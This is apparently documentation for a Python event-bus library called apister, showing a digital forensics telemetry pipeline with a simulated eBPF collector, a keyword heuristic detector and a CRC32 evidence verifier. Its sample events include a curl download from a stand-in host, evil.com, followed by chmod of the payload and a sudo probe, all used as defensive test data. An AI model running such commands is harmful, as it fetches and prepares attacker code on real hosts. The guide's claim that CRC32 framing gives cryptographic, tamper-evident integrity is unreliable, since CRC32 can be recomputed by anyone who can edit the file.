# Guide 22: Digital Forensics & Live Incident Response (DFIR)

## Problem & Architectural Challenge

Digital Forensics and Incident Response (DFIR) endpoint agents must collect volatile forensic telemetry from compromised or suspect machines:
- System call telemetry, process execution trees (`execve`), network socket openings (`connect`, `listen`), modified file descriptors, and shell histories.
- Multiple local forensic analyzers must inspect the telemetry concurrently:
  1. **Behavioral Heuristic Engine**: Detects living-off-the-land binaries (LOLBins), reverse shells, and privilege escalations.
  2. **YARA & IoC Scanner**: Matches known signatures and hashes against memory-resident buffers.
  3. **Tamper-Evident Flight Recorder**: Records immutable raw telemetry locally to disk so evidence is preserved even if network connectivity is severed or the host is shut down.

### The Pitfalls
- **Evidence Tampering & Silent Corruption**: If an attacker gains root/admin on the machine, they may attempt to alter or truncate forensic log files.
- **Data Loss During Shutdown**: Volatile network connections or memory mappings will vanish if the machine reboots before remote upload finishes.

### The Solution: Tamper-Evident Segmented Ledger with CRC32 & Restricted POSIX Permissions
`apister` secures collected forensics using:
- **Magic Byte & CRC32 Framing (`b"AP"`)**: Every recorded frame carries a 4-byte CRC32 checksum. Any modification or truncation is immediately caught by `decode_frame()`.
- **Restricted Permissions (`0o700`)**: Enforces `rwx------` isolation on forensic storage directories on POSIX platforms.
- **Durable Disk Buffer**: Ensures volatile endpoint artifacts survive sudden shutdowns.

---

## Architectural Flow

```
┌─────────────────────────────────────────────────────────────┐
│                 Live Endpoint Sensor (eBPF / ETW)           │
│           (Emits process spawns, network socket events)     │
└──────────────────────────────┬──────────────────────────────┘
                               │ await bus.publish("dfir/proc/exec", event)
                               ▼
                ┌──────────────────────────────┐
                │         apister Bus          │
                │  - CRC32 & Magic Byte Framing│
                │  - POSIX 0o700 isolation     │
                │  - Tamper-evident segments   │
                └──────────────┬───────────────┘
                               │
         ┌─────────────────────┼─────────────────────┐
         ▼                     ▼                     ▼
┌─────────────────┐   ┌─────────────────┐   ┌─────────────────┐
│ Behavioral Rule │   │ YARA / IoC      │   │ Secure Cloud    │
│ Heuristic Engine│   │ Matcher         │   │ Evidence Bridge │
│ (Sub: "dfir/#") │   │ (Sub: "dfir/#") │   │ (Sub: "dfir/#") │
└─────────────────┘   └─────────────────┘   └─────────────────┘
```

---

## Production Implementation

```python
import asyncio
import json
from pathlib import Path
from apister import Bus, OverflowPolicy


async def endpoint_ebpf_telemetry_collector(bus: Bus) -> None:
    """Simulates real-time eBPF syscall probe capturing process events."""
    suspicious_events = [
        {
            "pid": 1042,
            "cmd": "/usr/bin/curl",
            "args": ["-s", "http://evil.com/payload.sh"],
            "user": "www-data",
        },
        {
            "pid": 1043,
            "cmd": "/bin/bash",
            "args": ["-c", "chmod +x payload.sh"],
            "user": "www-data",
        },
        {"pid": 1044, "cmd": "/usr/bin/sudo", "args": ["-l"], "user": "www-data"},
    ]
    for event in suspicious_events:
        topic = "dfir/events/process_exec"
        # Recorded with b"AP" magic frame & CRC32 checksum automatically:
        await bus.publish(topic, json.dumps(event).encode("utf-8"))
        await asyncio.sleep(0.01)


async def behavioral_heuristic_detector(bus: Bus) -> None:
    """Evaluates telemetry in real time for suspicious execution chains."""
    sub = await bus.subscribe("dfir/events/+", name="heuristics_engine")
    async for envelope in sub:
        event = json.loads(envelope.payload.decode())
        if "curl" in event["cmd"] or "sudo" in event["cmd"]:
            print(
                f"  [ALERT] Suspicious command executed: {event['cmd']} {' '.join(event['args'])}"
            )
        await sub.ack(envelope)
        if event["pid"] == 1044:
            break


async def forensic_evidence_verifier(bus: Bus) -> None:
    """Validates frame integrity across the entire recorded evidence chain."""
    print("\n--- Verifying Forensic Evidence Chain Integrity ---")
    sub = await bus.subscribe("dfir/events/process_exec")  # Ephemeral reads from offset 0
    records_verified = 0
    async for envelope in sub:
        # Every envelope has passed b"AP" magic and CRC32 verification:
        records_verified += 1
        print(
            f"  [Verified Evidence] Offset: {envelope.offset:06d} | Valid CRC32 | Data: {envelope.payload[:40]}..."
        )
        if records_verified >= 3:
            break
    print(
        f"Audit Complete: All {records_verified} events verified with 100% cryptographic integrity.\n"
    )


async def main() -> None:
    storage = Path("data/dfir_evidence_ledger")
    async with await Bus.open(
        storage,
        segment_bytes=8 * 1024 * 1024,
        retain_bytes=500 * 1024 * 1024,
        overflow=OverflowPolicy.BLOCK,
    ) as bus:
        await asyncio.gather(
            endpoint_ebpf_telemetry_collector(bus),
            behavioral_heuristic_detector(bus),
        )
        await forensic_evidence_verifier(bus)


if __name__ == "__main__":
    asyncio.run(main())
```

---

## Best Practices & Tuning

1. **Cryptographic Validation**: Any corrupted bytes or disk sectors trigger `CorruptFrame` exceptions during deserialization, ensuring invalid or doctored evidence is flagged immediately.
2. **Offline Durability**: Telemetry written to the segmented ledger remains fully intact on disk even if the host machine loses network connectivity or is forcibly unpowered.
3. **`OverflowPolicy.BLOCK`**: In forensic collection, dropping audit logs is unacceptable; `BLOCK` ensures complete event retention.
